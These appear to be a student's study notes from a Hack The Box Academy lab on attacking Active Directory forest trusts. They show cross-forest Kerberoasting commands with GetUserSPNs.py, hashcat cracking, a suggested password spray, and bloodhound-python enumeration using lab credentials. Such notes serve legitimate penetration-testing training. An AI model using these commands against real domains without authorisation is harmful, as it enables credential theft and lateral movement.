- This section relies on the same techniques as [[26. Attacking Domain Trusts (Cross-Forest) - from Windows]]

## Cross-Forest Kerberoasting

#### Using GetUserSPNs.py
``` bash
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```


#### Using the -request Flag
``` bash
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
```
- `-request` returns the TGS ticket.
- `-outputfile <file>` will output the ticket into a file that can be cracked with hashcat mode 13100.

>Suppose we can Kerberoast across a trust and have run out of options in the current domain. In that case, **it could also be worth attempting a single password spray with the cracked password**, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned.


## Hunting Foreign Group Membership with Bloodhound-python

- From time to time we may see users or admins from one domain as members of a group in another domain. 
	- Since only `Domain Local Groups` allow users from outside their forest, it is not uncommon to see a highly privileged user from Domain A as a member of the built-in administrators group in domain B when dealing with a bidirectional forest trust relationship.

- On some assessments, our client may provision a VM for us that gets an IP from DHCP and is configured to use the internal domain's DNS. 
- We will be on an attack host without DNS configured in other instances. 
	- In this case, we would need to edit our `resolv.conf` file to run this [Bloodhound-python](https://github.com/fox-it/BloodHound.py) since it requires a DNS hostname for the target Domain Controller instead of an IP address. 
- We can edit the file as follows using sudo rights. Here we have commented out the current nameserver entries and added the domain name and the IP address of `ACADEMY-EA-DC01` as the nameserver.

![[2023-04-27 12_03_29-Hack The Box - Academy.png|600]]

#### Running bloodhound-python against INLANEFREIGHT.LOCAL
``` bash
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```

#### Compressing the File with zip -r
``` bash
zip -r ilfreight_bh.zip *.json
```

- We repeat the above steps with the other Domain, FREIGHTLOGISTICS.LOCAL
 
![[2023-04-27 12_06_02-Hack The Box - Academy.png|600]]

#### Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL
``` bash
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```


- After uploading the second set of data (either each JSON file or as one zip file), we can click on `Users with Foreign Domain Group Membership` under the `Analysis` tab and select the source domain as `INLANEFREIGHT.LOCAL`. 
	- Here, we will see the built-in Administrator account for the INLANEFREIGHT.LOCAL domain is a member of the built-in Administrators group in the FREIGHTLOGISTICS.LOCAL domain as we saw previously.

#### Viewing Dangerous Rights through BloodHound
![[Pasted image 20230427120729.png|600]]